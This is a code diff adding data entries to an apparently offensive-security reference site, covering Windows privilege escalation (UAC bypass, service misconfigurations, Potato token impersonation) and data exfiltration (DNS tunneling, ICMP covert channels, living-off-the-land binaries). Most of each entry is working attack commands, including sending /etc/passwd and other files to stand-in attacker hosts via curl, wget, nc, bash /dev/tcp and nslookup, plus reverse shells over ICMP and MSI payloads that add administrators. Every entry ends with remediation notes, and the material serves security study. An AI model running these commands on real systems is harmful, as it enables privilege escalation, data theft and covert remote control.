@@ -2887,6 +2887,505 @@ var VULNS = [
     ]
   },
   {
+    category: "Privilege Escalation",
+    vulns: [
+      {
+        id: "uac-bypass",
+        name: "UAC Bypass",
+        severity: "Medium",
+        ref: "https://attack.mitre.org/techniques/T1548/002/",
+        theory: "theory/2026-08-18-windows-tokens-uac.html",
+        description: "Abuse Windows auto-elevating binaries and trusted-path logic to run code with a full admin token from a filtered medium-integrity process — no consent prompt.",
+        brief: "When an administrator is logged in, most processes run with a filtered (medium-integrity) token; a full admin token requires a UAC consent prompt. Certain signed Microsoft binaries <em>auto-elevate</em> without prompting, and several read attacker-controllable registry keys or load libraries from writable/normalised paths. Hijacking one of those lets a medium-integrity process spawn a high-integrity one silently.\n\nImpact: UAC is a convenience boundary, not a security boundary — a bypass turns 'admin but not elevated' into full local administrator without alerting the user, the usual first step before dumping credentials or installing persistence.",
+        quickReference: [
+          { label: "Check integrity level", cmd: "whoami /groups | findstr Label   (Medium = not elevated)" },
+          { label: "fodhelper (registry hijack)", cmd: "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /d \"cmd.exe\" /f\nreg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /f\nfodhelper.exe" },
+          { label: "Automated (many techniques)", cmd: "UACME (akagi.exe) -m <method>   ;   metasploit bypassuac_* modules" },
+          { label: "eventvwr / sdclt / computerdefaults", cmd: "similar HKCU registry hijacks against other auto-elevating binaries" }
+        ],
+        sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Confirm you are admin but only medium integrity", cmd: "whoami /groups | findstr /i \"Label\"\n# 'Mandatory Label\\Medium Mandatory Level' = filtered token, UAC in the way\n# your user must be in the local Administrators group for elevation to be possible" },
+              { label: "2. fodhelper — hijack the ms-settings handler it auto-elevates through", cmd: "reg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /ve /d \"cmd.exe /c start cmd.exe\" /f\nreg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /v DelegateExecute /t REG_SZ /d \"\" /f\nfodhelper.exe\n# fodhelper auto-elevates, reads the HKCU handler, and launches your command HIGH integrity\nreg delete \"HKCU\\Software\\Classes\\ms-settings\" /f   # clean up" },
+              { label: "3. Other auto-elevating binaries follow the same pattern", cmd: "# eventvwr.exe  -> HKCU\\Software\\Classes\\mscfile\\shell\\open\\command\n# sdclt.exe     -> HKCU\\Software\\Classes\\Folder\\shell\\open\\command  / exefile\n# computerdefaults.exe -> ms-settings (same as fodhelper)" },
+              { label: "4. Trusted-directory / DLL-hijack variants (path normalization)", cmd: "# create a 'mock' trusted dir like C:\\Windows \\System32\\ (trailing space) and drop a\n# hijacked DLL an auto-elevating binary loads; the trusted-path check is fooled\n# UACME automates dozens of these (akagi.exe -m <n>)" },
+              { label: "5. Automate the whole thing", cmd: "# UACME implements 70+ methods across Windows versions\nakagi.exe 33 C:\\temp\\payload.exe\n# metasploit: use exploit/windows/local/bypassuac_fodhelper (set SESSION)" }
+            ]
+          },
+          {
+            title: "Why Bypasses Exist",
+            type: "table",
+            columns: ["Mechanism", "Detail"],
+            rows: [
+              ["Auto-elevation", "Some signed MS binaries elevate with no prompt (autoElevate=true in the manifest)"],
+              ["HKCU handler hijack", "They read program IDs / handlers from HKCU, which a medium process can write"],
+              ["Path normalization", "Trusted-directory checks can be fooled with mock dirs (trailing space/dot)"],
+              ["DLL search order", "An auto-elevating binary loads a DLL from a writable/normalised path"],
+              ["Not a security boundary", "Microsoft does not service UAC bypasses as vulnerabilities"]
+            ]
+          },
+          {
+            title: "Attack Chain",
+            type: "table",
+            columns: ["Step", "Action", "Result"],
+            rows: [
+              ["1", "Admin user, medium-integrity process", "Filtered token, need elevation"],
+              ["2", "Plant an HKCU handler / hijack DLL", "Attacker-controlled elevation path"],
+              ["3", "Launch the auto-elevating binary", "It runs your command high-integrity"],
+              ["4", "Clean up the registry/DLL artifacts", "Silent full-admin token"],
+              ["5", "Dump creds / persist as admin", "Consolidated local compromise"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["UACME (akagi)", "70+ implemented UAC bypass methods"],
+              ["reg.exe / PowerShell", "Plant the HKCU handler for the manual techniques"],
+              ["Metasploit bypassuac_* modules", "Automated bypass from a session"],
+              ["Process Explorer / sigcheck", "Find auto-elevating (autoElevate) binaries"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "MITRE ATT&CK T1548.002 — Bypass User Account Control", url: "https://attack.mitre.org/techniques/T1548/002/" },
+              { label: "UACME — UAC bypass collection", url: "https://github.com/hfiref0x/UACME" },
+              { label: "Hadess — UAC Evasion", url: "https://hadess.io/" }
+            ]
+          },
+          {
+            title: "Remediation",
+            type: "notes",
+            items: [
+              "Set UAC to the highest level (Always Notify) so even auto-elevating binaries prompt.",
+              "Do not let daily-use accounts be local administrators; use a separate admin account and a PAW for admin tasks.",
+              "Monitor HKCU handler keys (ms-settings, mscfile, Folder\\shell\\open\\command) and auto-elevating binaries spawning shells.",
+              "Application allow-listing (WDAC/AppLocker) limits what an elevated child can run.",
+              "Detect: fodhelper/eventvwr/sdclt/computerdefaults launching cmd/powershell, and writes to the known hijack registry paths."
+            ]
+          }
+        ]
+      },
+      {
+        id: "windows-service-privesc",
+        name: "Service & Registry Misconfigurations",
+        severity: "High",
+        ref: "https://attack.mitre.org/techniques/T1543/003/",
+        theory: "theory/2026-08-18-windows-tokens-uac.html",
+        description: "Weak service permissions, unquoted service paths, writable service binaries, and AlwaysInstallElevated let a normal user run code as SYSTEM.",
+        brief: "Windows services usually run as SYSTEM, so any weakness that lets a low-privileged user influence what a service executes is a direct path to SYSTEM. The classics: a service whose configuration you can change (weak service DACL), a service binary or its folder you can overwrite, an unquoted path containing spaces, or the AlwaysInstallElevated policy.\n\nImpact: these are the bread-and-butter of Windows local privilege escalation — a single misconfiguration on one host promotes a foothold to full local control, from where credential dumping and lateral movement follow.",
+        quickReference: [
+          { label: "Auto-enumerate privesc paths", cmd: "winPEAS.exe   ;   PowerUp: Invoke-AllChecks   ;   Seatbelt.exe -group=all" },
+          { label: "Weak service DACL — repoint + run", cmd: "sc config <svc> binPath= \"C:\\temp\\rev.exe\" & sc start <svc>   (needs SERVICE_CHANGE_CONFIG)" },
+          { label: "Unquoted service path", cmd: "Drop C:\\Program.exe for 'C:\\Program Files\\...\\svc.exe' unquoted, then restart the service" },
+          { label: "AlwaysInstallElevated", cmd: "msfvenom -f msi -o evil.msi ... ; msiexec /quiet /qn /i evil.msi   (runs as SYSTEM)" }
+        ],
+        sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Enumerate — let a tool find the winnable misconfig", cmd: "# any of these surfaces weak services, unquoted paths, writable dirs, GPP, AutoLogon...\nwinPEASx64.exe quiet\npowershell -ep bypass -c \"Import-Module .\\PowerUp.ps1; Invoke-AllChecks\"\nSeatbelt.exe -group=all" },
+              { label: "2. Weak service permissions — you can reconfigure the service", cmd: "# accesschk shows SERVICE_CHANGE_CONFIG for your group:\naccesschk.exe /accepteula -uwcqv \"Authenticated Users\" *\nsc config vulnsvc binPath= \"C:\\Windows\\Temp\\rev.exe\"\nsc stop vulnsvc & sc start vulnsvc   # rev.exe runs as the service account (often SYSTEM)" },
+              { label: "3. Unquoted service path — Windows tries each space-split prefix", cmd: "# 'C:\\Program Files\\Vuln Service\\svc.exe' unquoted -> tries C:\\Program.exe first\nsc qc vulnsvc | findstr BINARY_PATH_NAME   # confirm no quotes + a space + a writable dir\ncopy rev.exe \"C:\\Program Files\\Vuln.exe\"   # if that folder is writable\nsc stop vulnsvc & sc start vulnsvc" },
+              { label: "4. Writable service binary — just overwrite it", cmd: "# if you can write the .exe or its folder:\ncopy /y rev.exe \"C:\\Path\\To\\service.exe\"\nsc stop vulnsvc & sc start vulnsvc   # or wait for a reboot" },
+              { label: "5. AlwaysInstallElevated — MSI installs run as SYSTEM", cmd: "reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n# both = 1 ->\nmsfvenom -p windows/x64/exec CMD='net localgroup administrators user /add' -f msi -o e.msi\nmsiexec /quiet /qn /i e.msi" }
+            ]
+          },
+          {
+            title: "Misconfiguration Classes",
+            type: "table",
+            columns: ["Class", "Why it escalates"],
+            rows: [
+              ["Weak service DACL", "Reconfigure the service binPath → run your code as SYSTEM"],
+              ["Unquoted service path", "A writable higher-level directory + space lets Windows run your exe"],
+              ["Writable service binary/dir", "Overwrite the executable a SYSTEM service runs"],
+              ["AlwaysInstallElevated", "Any MSI installs with SYSTEM privileges"],
+              ["Weak registry (service Image​Path)", "Change the binary a service loads via its registry key"],
+              ["DLL hijacking / missing DLL", "A SYSTEM process loads a DLL from a writable path"]
+            ]
+          },
+          {
+            title: "Attack Chain",
+            type: "table",
+            columns: ["Step", "Action", "Result"],
+            rows: [
+              ["1", "Enumerate host with winPEAS/PowerUp", "Concrete misconfiguration"],
+              ["2", "Weaponise it (repoint/overwrite/MSI)", "Payload set to run as SYSTEM"],
+              ["3", "Trigger (restart service / reboot / msiexec)", "Execution as SYSTEM"],
+              ["4", "Dump creds / persist", "Full host control"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["winPEAS / Seatbelt", "Automated privilege-escalation enumeration"],
+              ["PowerUp (PowerSploit)", "Find and auto-abuse service/registry misconfigs"],
+              ["accesschk (Sysinternals)", "Confirm object DACLs (who can change a service)"],
+              ["sc.exe / msiexec / msfvenom", "Reconfigure services, install MSI, build payloads"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "MITRE ATT&CK T1543.003 — Windows Service", url: "https://attack.mitre.org/techniques/T1543/003/" },
+              { label: "HackTricks — Windows local privilege escalation", url: "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation" }
+            ]
+          },
+          {
+            title: "Remediation",
+            type: "notes",
+            items: [
+              "Quote all service binary paths and audit service DACLs so non-admins cannot change configuration.",
+              "Restrict write access to service executables and their directories (Program Files should not be user-writable).",
+              "Never enable AlwaysInstallElevated; it is a direct SYSTEM primitive for any user.",
+              "Run services with the least privilege necessary (a low-priv or gMSA account rather than SYSTEM where possible).",
+              "Detect: service binPath changes (event 7040/4697), new services, and MSI installs from user context."
+            ]
+          }
+        ]
+      },
+      {
+        id: "token-impersonation",
+        name: "Token Impersonation (Potato Attacks)",
+        severity: "High",
+        ref: "https://attack.mitre.org/techniques/T1134/001/",
+        theory: "theory/2026-08-18-windows-tokens-uac.html",
+        description: "A service account holding SeImpersonatePrivilege can coerce a SYSTEM authentication and impersonate its token to become SYSTEM.",
+        brief: "Windows service accounts (IIS, MSSQL, and many others) typically hold <code>SeImpersonatePrivilege</code> — the right to impersonate a token they receive. The 'Potato' family abuses this: coerce a privileged (SYSTEM) process to authenticate to a local listener, capture its token, and impersonate it.\n\nImpact: this turns the common 'I have code execution as a low-privileged service account' situation into SYSTEM on the box — the standard escalation after landing a web shell or SQL command execution as a service identity.",
+        quickReference: [
+          { label: "Check for the privilege", cmd: "whoami /priv | findstr /i \"SeImpersonate SeAssignPrimaryToken\"" },
+          { label: "PrintSpoofer (modern, reliable)", cmd: "PrintSpoofer.exe -i -c cmd.exe" },
+          { label: "RoguePotato / GodPotato", cmd: "GodPotato.exe -cmd \"cmd /c whoami\"" },
+          { label: "JuicyPotato (older Windows)", cmd: "JuicyPotato.exe -l 1337 -p cmd.exe -a \"/c payload\" -t *" }
+        ],
+        sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Confirm SeImpersonatePrivilege on your (service) account", cmd: "whoami /priv | findstr /i \"SeImpersonatePrivilege\"\n# common as IIS APPPOOL\\..., NT SERVICE\\MSSQL..., or after landing a webshell/xp_cmdshell" },
+              { label: "2. PrintSpoofer — coerce the spooler's SYSTEM auth (Win10/2019+)", cmd: "PrintSpoofer.exe -i -c cmd.exe\n#   -i   interact with the spawned process\n#   -c   command to run as SYSTEM\n# abuses the print spooler's named-pipe to hand you a SYSTEM token" },
+              { label: "3. GodPotato / RoguePotato — DCOM/OXID coercion (broad version support)", cmd: "GodPotato.exe -cmd \"cmd /c net localgroup administrators lowuser /add\"\n# RoguePotato.exe -r <attacker_ip> -e \"cmd.exe\" -l 9999" },
+              { label: "4. JuicyPotato — classic (older Windows, before the OXID fixes)", cmd: "JuicyPotato.exe -l 1337 -p c:\\temp\\rev.exe -t * -c {CLSID}\n# pick a CLSID that runs as SYSTEM for the target OS" },
+              { label: "5. You are now SYSTEM", cmd: "whoami   # nt authority\\system  ->  dump LSASS / SAM, then move laterally" }
+            ]
+          },
+          {
+            title: "The Potato Family",
+            type: "table",
+            columns: ["Tool", "Best for"],
+            rows: [
+              ["PrintSpoofer", "Windows 10 / Server 2016-2019+, spooler named-pipe coercion"],
+              ["RoguePotato", "Post-JuicyPotato OXID resolver fix; needs a redirector"],
+              ["GodPotato", "Broad modern coverage via DCOM"],
+              ["JuicyPotato", "Older Windows (pre-2019) using a SYSTEM CLSID"],
+              ["Common requirement", "SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege"]
+            ]
+          },
+          {
+            title: "Attack Chain",
+            type: "table",
+            columns: ["Step", "Action", "Result"],
+            rows: [
+              ["1", "Code execution as a service account", "Context with SeImpersonate"],
+              ["2", "Run a Potato tool", "Coerce a SYSTEM authentication locally"],
+              ["3", "Impersonate the captured SYSTEM token", "Execute as SYSTEM"],
+              ["4", "Dump credentials / persist", "Full host compromise"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["PrintSpoofer", "Spooler-based SYSTEM impersonation"],
+              ["GodPotato / RoguePotato", "DCOM/OXID-based impersonation on modern Windows"],
+              ["JuicyPotato", "CLSID-based impersonation on older Windows"],
+              ["whoami /priv", "Confirm the required privilege"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "MITRE ATT&CK T1134.001 — Token Impersonation/Theft", url: "https://attack.mitre.org/techniques/T1134/001/" },
+              { label: "The Hacker Recipes — Abusing tokens", url: "https://www.thehacker.recipes/ad/movement/access-tokens" }
+            ]
+          },
+          {
+            title: "Remediation",
+            type: "notes",
+            items: [
+              "Remove SeImpersonatePrivilege from service accounts that do not require it, and run services least-privileged.",
+              "Keep Windows patched; several Potato variants depend on specific unpatched behaviours.",
+              "Disable the Print Spooler where it is not needed (also mitigates PrinterBug coercion).",
+              "Contain web/SQL service accounts (separate hosts, restricted rights) so a foothold cannot reach SYSTEM easily.",
+              "Detect: named-pipe/DCOM coercion patterns and a service account spawning SYSTEM processes."
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    category: "Exfiltration",
+    vulns: [
+      {
+        id: "dns-exfiltration",
+        name: "DNS Exfiltration & Tunneling",
+        severity: "Medium",
+        ref: "https://attack.mitre.org/techniques/T1048/",
+        description: "Encode stolen data into DNS queries so it leaves the network through resolvers that firewalls rarely block or inspect.",
+        brief: "DNS is almost always allowed outbound and is rarely deep-inspected, which makes it an ideal covert exfiltration channel. Data is encoded (hex/base32) into the labels of queries for a domain the attacker controls; the authoritative name server they run receives and reassembles it. Interactive tunnels (dnscat2, iodine) build a full bidirectional channel this way.\n\nImpact: an attacker can slowly exfiltrate credentials, files, or command output — and even run an interactive C2 channel — from a segmented network that blocks direct outbound connections, using only DNS.",
+        quickReference: [
+          { label: "Manual exfil (data in the subdomain)", cmd: "for c in $(cat secret|base32|tr -d '='); do nslookup $c.exfil.attacker.com; done" },
+          { label: "dnscat2 (interactive C2 tunnel)", cmd: "server: dnscat2-server exfil.attacker.com\nclient: dnscat2 exfil.attacker.com" },
+          { label: "iodine (IP-over-DNS tunnel)", cmd: "server: iodined -f 10.0.0.1 tunnel.attacker.com\nclient: iodine tunnel.attacker.com" },
+          { label: "Windows one-liner (exfil a file)", cmd: "$d=[Convert]::ToBase64String((gc secret.txt -Encoding byte)); nslookup \"$d.exfil.attacker.com\"" }
+        ],
+        sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Control an authoritative name server for a domain you own", cmd: "# delegate exfil.attacker.com to a server you run; every query for *.exfil.attacker.com\n# is delivered to you, carrying whatever data is in the labels" },
+              { label: "2. Manual exfiltration — encode data into query names", cmd: "# base32 avoids case/charset issues in DNS labels\ncat /etc/passwd | base32 -w40 | while read chunk; do\n  nslookup \"$chunk.exfil.attacker.com\" >/dev/null\ndone\n# reassemble the chunks in the order queries arrive at your DNS server" },
+              { label: "3. Interactive channel with dnscat2 (encrypted C2 over DNS)", cmd: "# attacker (authoritative server):\ndnscat2-server exfil.attacker.com\n# victim:\ndnscat2 exfil.attacker.com   # full shell/file transfer tunneled in DNS" },
+              { label: "4. Full IP tunnel with iodine (route traffic over DNS)", cmd: "# attacker:\nsudo iodined -f -c -P secret 10.0.0.1 tunnel.attacker.com\n# victim:\nsudo iodine -f -P secret tunnel.attacker.com   # a tun interface over DNS" },
+              { label: "5. Throttle to blend in", cmd: "# space queries out and keep names plausible; a flood of long random subdomains\n# to one domain is the classic detection signature" }
+            ]
+          },
+          {
+            title: "Why DNS Works for Exfil",
+            type: "table",
+            columns: ["Property", "Consequence"],
+            rows: [
+              ["Almost always allowed outbound", "Egress filtering rarely blocks DNS"],
+              ["Goes via the internal resolver", "Reaches the internet even from segmented networks"],
+              ["Rarely deep-inspected", "Payload in labels passes uninspected"],
+              ["Recursive resolution", "The attacker's authoritative server receives the data"],
+              ["Low and slow", "Small per-query capacity, but persistent"]
+            ]
+          },
+          {
+            title: "Attack Chain",
+            type: "table",
+            columns: ["Step", "Action", "Result"],
+            rows: [
+              ["1", "Register a domain + run its name server", "A collection point for queries"],
+              ["2", "Encode data into subdomain labels", "Exfil-ready query stream"],
+              ["3", "Issue queries from the victim", "Data delivered to the attacker's NS"],
+              ["4", "Reassemble / run dnscat2 tunnel", "Files exfiltrated / interactive C2"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["dnscat2", "Encrypted interactive C2 and file transfer over DNS"],
+              ["iodine", "IP-over-DNS tunnel (full network tunnel)"],
+              ["nslookup / dig / PowerShell", "Manual query-based exfiltration"],
+              ["DNSExfiltrator", "Windows data exfiltration over DNS"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "MITRE ATT&CK T1048 — Exfiltration Over Alternative Protocol", url: "https://attack.mitre.org/techniques/T1048/" },
+              { label: "dnscat2", url: "https://github.com/iagox86/dnscat2" }
+            ]
+          },
+          {
+            title: "Remediation",
+            type: "notes",
+            items: [
+              "Force all clients through controlled internal resolvers and block direct outbound DNS (UDP/TCP 53) from endpoints.",
+              "Monitor DNS for anomalies: high query volume to one domain, long/high-entropy subdomains, and unusual record types (TXT/NULL).",
+              "Deploy DNS security (RPZ, threat feeds) and consider DNS logging/inspection at the resolver.",
+              "Egress-filter and segment so that even if DNS leaks, other channels are blocked.",
+              "Detect: NXDOMAIN spikes, base32/hex-looking labels, and known tunneling tool signatures."
+            ]
+          }
+        ]
+      },
+      {
+        id: "covert-channel-exfil",
+        name: "Covert Channel Tunneling (ICMP / Protocol Abuse)",
+        severity: "Medium",
+        ref: "https://attack.mitre.org/techniques/T1048/",
+        description: "Hide data and even interactive shells inside protocols firewalls usually permit — ICMP echo, fragmented IP, or a port already in use.",
+        brief: "Beyond DNS, attackers tunnel data inside protocols that egress rules commonly allow. ICMP echo requests/replies (ping) carry arbitrary data payloads; IP fragmentation slips past stateless rules; and tools like tunnelshell open a covert TCP/UDP/ICMP channel that shows no listening process to <code>netstat</code>.\n\nImpact: on a network that blocks normal outbound connections, an attacker can still exfiltrate data and maintain an interactive shell over ICMP or fragmented traffic — channels defenders often forget to inspect.",
+        quickReference: [
+          { label: "ICMP tunnel (tunnelshell)", cmd: "victim: ./tunneld -t icmp -m echo-reply,echo\nattacker: ./tunnel -t icmp -m echo-reply,echo 10.10.10.2" },
+          { label: "Fragmented-IP tunnel", cmd: "victim: ./tunneld -t frag\nattacker: ./tunnel -t frag 10.10.10.2" },
+          { label: "ICMP data exfil (icmptunnel / hping3)", cmd: "hping3 -1 -E secret.txt -d 1400 attacker_ip" },
+          { label: "Reverse shell over ICMP", cmd: "icmpsh / icmptunnel for interactive shell without opening a TCP port" }
+        ],
+        sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. ICMP covert channel — data rides inside ping payloads", cmd: "# tunnelshell: no listening port, invisible to netstat/ps grep on the wire\n# victim (server):\nsudo ./tunneld -t icmp -m echo-reply,echo\n# attacker (client) gets a shell over ICMP:\n./tunnel -t icmp -m echo-reply,echo 10.10.10.2" },
+              { label: "2. Fragmented-IP channel — slip past stateless firewall rules", cmd: "# some firewalls pass fragments without the L4 header, permitting them despite rules\n# victim:\nsudo ./tunneld -t frag\n# attacker:\n./tunnel -t frag 10.10.10.2" },
+              { label: "3. Quick ICMP file exfil with hping3", cmd: "# push file bytes into ICMP echo data\nhping3 -1 --icmp -E /etc/passwd -d 1400 attacker_ip\n# attacker captures and reassembles with tcpdump/wireshark on icmp" },
+              { label: "4. Interactive reverse shell over ICMP (no TCP port)", cmd: "# attacker:\nsudo icmpsh -t <victim_ip> -d 500\n# victim:\nicmpsh.exe -t <attacker_ip>   # shell tunneled entirely in ICMP" },
+              { label: "5. Verify stealth", cmd: "# on the victim, the channel shows no TCP/UDP listener:\nnetstat -ano | findstr LISTEN   # nothing for the tunnel\n# detection has to happen on the network, by inspecting ICMP/fragment payloads" }
+            ]
+          },
+          {
+            title: "Covert Channels",
+            type: "table",
+            columns: ["Channel", "How it hides"],
+            rows: [
+              ["ICMP echo", "Arbitrary data in the ping payload; often allowed outbound"],
+              ["IP fragmentation", "Fragments without L4 headers bypass stateless rules"],
+              ["HTTP/TCP (no handshake)", "tunnelshell TCP mode reuses a port, no 3-way handshake"],
+              ["UDP/DNS", "See DNS Exfiltration"],
+              ["No local socket", "tunnelshell shows no PID/port in netstat — host-side blind spot"]
+            ]
+          },
+          {
+            title: "Attack Chain",
+            type: "table",
+            columns: ["Step", "Action", "Result"],
+            rows: [
+              ["1", "Identify an allowed protocol (ICMP/frag)", "A viable covert channel"],
+              ["2", "Start the tunnel server on the victim", "Covert listener with no visible socket"],
+              ["3", "Connect from outside", "Interactive shell / data channel"],
+              ["4", "Exfiltrate data through it", "Data leaves via 'permitted' traffic"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["tunnelshell", "ICMP / frag / TCP / UDP covert channels, no local socket"],
+              ["icmpsh / icmptunnel", "Interactive shell over ICMP"],
+              ["hping3", "Craft ICMP packets with file data in the payload"],
+              ["Wireshark / tcpdump", "Capture and reassemble the covert traffic (attacker side)"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "MITRE ATT&CK T1048 — Exfiltration Over Alternative Protocol", url: "https://attack.mitre.org/techniques/T1048/" },
+              { label: "HackingArticles — Data exfiltration (covert channels)", url: "https://www.hackingarticles.in/data-exfiltration/" }
+            ]
+          },
+          {
+            title: "Remediation",
+            type: "notes",
+            items: [
+              "Egress-filter strictly: block or tightly limit outbound ICMP and enforce that only proxies reach the internet.",
+              "Configure firewalls to reassemble/inspect fragments rather than passing headerless fragments.",
+              "Inspect ICMP payload sizes and rates; normal ping is small and regular, tunnels are not.",
+              "Force outbound traffic through inspecting proxies so raw TCP/UDP/ICMP cannot leave endpoints.",
+              "Detect: oversized/asymmetric ICMP, high fragment volume, and known tunneling signatures."
+            ]
+          }
+        ]
+      },
+      {
+        id: "lolbin-exfil",
+        name: "Exfiltration via Living-off-the-Land Binaries",
+        severity: "Medium",
+        ref: "https://attack.mitre.org/techniques/T1567/",
+        description: "Use trusted, pre-installed system binaries — curl, wget, certutil, bitsadmin, nc, openssl, even finger and whois — to move data out without dropping tooling.",
+        brief: "Every OS ships binaries that can transfer data, and abusing them (LOLBins/GTFOBins) lets an attacker exfiltrate without installing anything that would look out of place. On Linux: curl/wget POST, nc, openssl, bash's /dev/tcp, and even whois/finger/busybox. On Windows: certutil, bitsadmin, PowerShell, and curl.\n\nImpact: because the binaries are signed/trusted and expected on the host, this exfiltration blends into normal activity and evades tooling that watches for unknown executables — a low-effort, high-stealth way to get stolen data off the box.",
+        quickReference: [
+          { label: "Linux — HTTP POST a file", cmd: "curl -X POST -d @/etc/passwd http://attacker\nwget --post-file=/etc/passwd http://attacker" },
+          { label: "Linux — bash /dev/tcp (no tools)", cmd: "bash -c 'cat /etc/passwd > /dev/tcp/attacker/1234'" },
+          { label: "Linux — TLS-wrapped exfil", cmd: "openssl s_client -quiet -connect attacker:1234 < /etc/passwd" },
+          { label: "Windows — certutil / bitsadmin", cmd: "certutil -encode secret.txt s.b64 & certutil -urlcache -f http://attacker/up (post)\nbitsadmin /transfer j http://attacker/x C:\\x" }
+        ],
+        sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Linux HTTP exfil with curl/wget (listener catches the POST)", cmd: "# attacker:  nc -lvp 80\n# victim:\ncurl -X POST -d @/etc/passwd http://attacker_ip\nwget --post-file=/etc/passwd http://attacker_ip" },
+              { label: "2. No transfer tool? bash's built-in /dev/tcp", cmd: "# attacker:  nc -lvp 1234\n# victim (bash only):\ncat /etc/passwd > /dev/tcp/attacker_ip/1234\n# or an HTTP-shaped one:\nbash -c 'echo -e \"POST / HTTP/1.0\\n\\n$(</etc/passwd)\" > /dev/tcp/attacker_ip/1234'" },
+              { label: "3. Encrypt in transit with openssl (defeats plaintext IDS)", cmd: "# attacker: openssl req -x509 -newkey rsa:4096 -keyout k.pem -out c.pem -days 365 -nodes\n#           openssl s_server -quiet -key k.pem -cert c.pem -port 1234 > loot\n# victim:\nopenssl s_client -quiet -connect attacker_ip:1234 < /etc/passwd" },
+              { label: "4. Obscure LOLBins the same idea reaches", cmd: "# nc:      nc attacker_ip 5555 < secret.txt\n# whois:   whois -h attacker_ip -p 43 \"$(cat /etc/passwd)\"\n# finger:  finger \"$(cat /etc/passwd)@attacker_ip\"\n# host an HTTP server to pull instead: busybox httpd -f -p 8080 -h .  /  irb WEBrick" },
+              { label: "5. Windows LOLBins", cmd: "certutil -encode C:\\loot.zip C:\\loot.b64   # then POST/upload the b64\nbitsadmin /transfer job /upload http://attacker/up C:\\loot.zip\npowershell -c \"Invoke-RestMethod -Uri http://attacker/up -Method Post -InFile C:\\loot.zip\"\ncurl.exe -X POST --data-binary @C:\\loot.zip http://attacker/up" }
+            ]
+          },
+          {
+            title: "Binary → Channel",
+            type: "table",
+            columns: ["Binary", "Exfil method"],
+            rows: [
+              ["curl / wget", "HTTP(S) POST / upload"],
+              ["nc (netcat)", "Raw TCP transfer"],
+              ["bash /dev/tcp", "Pure-shell TCP, no external tool"],
+              ["openssl s_client", "TLS-encrypted TCP"],
+              ["whois / finger", "Data smuggled into the query argument"],
+              ["certutil / bitsadmin (Win)", "Encode + BITS/HTTP transfer"],
+              ["busybox httpd / irb WEBrick", "Serve files for the attacker to pull"]
+            ]
+          },
+          {
+            title: "Attack Chain",
+            type: "table",
+            columns: ["Step", "Action", "Result"],
+            rows: [
+              ["1", "Collect and stage the target data", "Loot ready to move"],
+              ["2", "Pick a trusted binary already on the host", "No new tooling to flag"],
+              ["3", "Transfer via HTTP/TCP/TLS to your listener", "Data leaves as normal-looking traffic"],
+              ["4", "Optionally encode/encrypt", "Evades content inspection"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["curl / wget / nc / openssl / bash", "Linux LOLBin transfer channels"],
+              ["certutil / bitsadmin / PowerShell / curl.exe", "Windows LOLBin transfer"],
+              ["GTFOBins / LOLBAS", "Reference catalogues of abusable binaries"],
+              ["netcat (attacker listener)", "Receive the exfiltrated data"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "MITRE ATT&CK T1567 — Exfiltration Over Web Service", url: "https://attack.mitre.org/techniques/T1567/" },
+              { label: "GTFOBins", url: "https://gtfobins.github.io/" },
+              { label: "LOLBAS (Windows)", url: "https://lolbas-project.github.io/" }
+            ]
+          },
+          {
+            title: "Remediation",
+            type: "notes",
+            items: [
+              "Enforce egress filtering: endpoints should reach the internet only through inspecting proxies, not arbitrary hosts/ports.",
+              "Apply application allow-listing and command-line logging so LOLBin misuse (certutil/bitsadmin encoding, /dev/tcp) is visible.",
+              "Monitor for anomalous outbound connections from server processes and unusual use of transfer binaries.",
+              "Use DLP to detect sensitive data leaving over HTTP/HTTPS, and restrict where servers can connect.",
+              "Detect: certutil -encode/-urlcache, bitsadmin transfers, bash /dev/tcp, and curl/wget POSTing local files."
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
     category: "Misconfigurations",
     vulns: [
       {
